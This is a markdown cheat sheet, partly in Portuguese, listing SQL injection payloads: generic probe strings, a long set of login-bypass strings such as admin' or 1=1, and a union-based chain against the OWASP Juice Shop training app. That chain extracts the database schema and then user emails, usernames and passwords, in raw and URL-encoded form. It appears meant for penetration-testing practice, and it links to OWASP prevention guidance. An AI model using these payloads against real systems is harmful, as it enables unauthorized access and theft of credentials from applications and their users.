# SQL Inject Basic Payloads
```
'
' --
1'
''
`
``
,
"
""
/
//
\
\\
;
' or "
-- or # 
' OR '1
' OR 1 -- -
" OR "" = "
" OR 1 = 1 -- -
' OR '' = '
'='
'LIKE'
'=0--+
 OR 1=1
' OR 'x'='x
' AND id IS NULL; --

1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+

Comentarios:

#
/*
-- -
;%00
`
```
# SQL Inject Bypass de Auth
```
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
admin' or 1=1
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
```
# SQL Inject Extract Schema Database Juice-Shop

')

')) --

')) order by 9 -- 

')) union all select 1,2,3,4,5,6,7,8,9 -- 

')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master -- 

')) union all select 1,email,username,4,password,6,7,8,9 from Users -- 

Link

https://www.urlencoder.org

```
')

'))%20--%20

'))%20order%20by%209%20--%20

'))%20union%20all%20select%201,2,3,4,5,6,7,8,9%20--%20

'))%20union%20all%20select%201,2,3,sql,5,6,7,8,9%20from%20sqlite_master%20--%20

'))%20union%20all%20select%201,email,username,4,password,6,7,8,9%20from%20Users%20--%20
```
## Links

https://www.w3schools.com/sql/sql_injection.asp

https://github.com/gui1535/sql-injection-list

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master

https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

https://dev.mysql.com/doc

https://www.sqlite.org/faq.html
